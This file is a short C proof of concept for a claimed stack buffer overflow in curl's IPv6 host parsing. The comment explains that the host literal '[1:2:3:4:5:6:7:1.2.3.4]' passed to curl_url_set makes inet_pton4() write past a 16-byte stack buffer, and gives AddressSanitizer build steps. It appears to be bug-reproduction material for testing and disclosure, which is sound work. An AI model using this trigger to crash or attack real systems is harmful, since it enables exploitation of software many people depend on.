/* PoC: stack-buffer-overflow in inet_pton6() via curl_url_set(CURLUPART_HOST).
 *
 * A host literal with exactly 7 full hextets followed by an embedded
 * dotted-quad ("1:2:3:4:5:6:7:1.2.3.4") is not a valid IPv6 address (it
 * would total 9 groups), but the bounds check guarding the embedded-IPv4
 * write only accounts for a 2-byte hextet instead of the 4-byte IPv4
 * result, so inet_pton4() writes 4 bytes 2 bytes past the end of the
 * 16-byte on-stack address buffer.
 *
 * Build against the patched tree, e.g.:
 *   cc -fsanitize=address -g -O0 -I/work/include -I/work/lib newbug.c \
 *      /work/build-asan/lib/libcurl-d.a -o newbug
 */
#include <stdio.h>
#include <curl/curl.h>

int main(void)
{
  CURLU *h = curl_url();
  CURLUcode rc;

  if(!h) {
    fprintf(stderr, "curl_url() failed\n");
    return 2;
  }

  rc = curl_url_set(h, CURLUPART_HOST, "[1:2:3:4:5:6:7:1.2.3.4]", 0);
  printf("curl_url_set() returned %d\n", (int)rc);

  curl_url_cleanup(h);
  return 0;
}
